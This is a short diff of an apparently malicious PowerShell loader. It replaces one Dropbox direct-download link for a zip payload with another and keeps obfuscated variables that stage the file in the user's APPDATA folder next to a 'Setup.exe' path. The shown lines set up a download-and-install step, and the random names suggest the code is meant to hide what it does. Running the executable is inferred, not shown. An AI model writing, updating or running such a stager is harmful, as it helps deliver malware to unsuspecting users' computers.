@@ -1,4 +1,4 @@
-$zxty = 'https://www.dropbox.com/scl/fi/u7f243x1bh1v6ji00ablb/file_azlm5.zip?rlkey=8xc0d0uj3jk5fpjlwmbrebb75&st=q8dasqmf&dl=1'
+$zxty = 'https://www.dropbox.com/scl/fi/xtlaealo935dmnf1ng3yb/sure.zip?rlkey=xkkj7qm3m809ednjvgswybv00&st=ccb31lbc&dl=1'
 $qbrw = "$env:APPDATA\file_azlm5.zip"
 $lpmk = "$env:APPDATA\Install_4278"
 $vkdy = Join-Path $lpmk 'Setup.exe'
